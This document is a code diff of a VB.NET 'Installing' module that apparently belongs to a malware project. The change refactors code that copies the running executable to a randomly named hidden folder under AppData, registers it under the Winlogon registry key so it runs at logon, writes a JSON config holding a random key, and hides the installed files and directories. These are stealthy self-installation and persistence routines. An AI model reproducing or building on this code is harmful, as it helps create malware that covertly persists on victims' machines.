@@ -6,24 +6,25 @@ Imports Newtonsoft.Json
 
 Module Installing
     Public Sub Install()
-        If Not File.Exists(GetPathes.get_JsonFilewithPath()) Then
+        If Not File.Exists(GetPathes.Get_JsonFilewithPath()) Then
             Console.WriteLine("Installing")
-            Dim main_file As String = Process.GetCurrentProcess().MainModule.ModuleName
-            Dim installPath As String = getAppdata() & "\" & RandomString(5, 8)
+            Dim installPath As String = GetAppdata() & "\" & RandomString(5, 8)
             Dim Re_Named_Main_file As String = RandomString(4, 8) & ".exe"
             IOModule.CreateDirectory(installPath)
-            System.IO.File.Copy(main_file, installPath & "\" & Re_Named_Main_file)
-            Dim ExeptFiles As New ArrayList
-            ExeptFiles.Add(Re_Named_Main_file)
+            System.IO.File.Copy(GetMainFile(), installPath & "\" & Re_Named_Main_file)
+            Dim ExeptFiles As New ArrayList From {
+                Re_Named_Main_file
+            }
             Copy_filesExept(installPath, ExeptFiles)
             Copy_directories(installPath)
-            StartupRegistryModule.Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & main_file)
-            Dim config As New Config
-            config.Key = RandomString(10, 10)
-            config.MainFileName = Re_Named_Main_file
-            config.MainPath = installPath
+            StartupRegistryModule.Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
+            Dim config As New Config With {
+                .Key = RandomString(10, 10),
+                .MainFileName = Re_Named_Main_file,
+                .MainPath = installPath
+            }
             Dim jsonString As String = JsonConvert.SerializeObject(config)
-            IOModule.Write_file(GetPathes.get_JsonFilewithPath(), jsonString)
+            IOModule.Write_file(GetPathes.Get_JsonFilewithPath(), jsonString)
             HidderModule.Hide_files(installPath)
             HidderModule.Hide_directories(installPath)
         End If
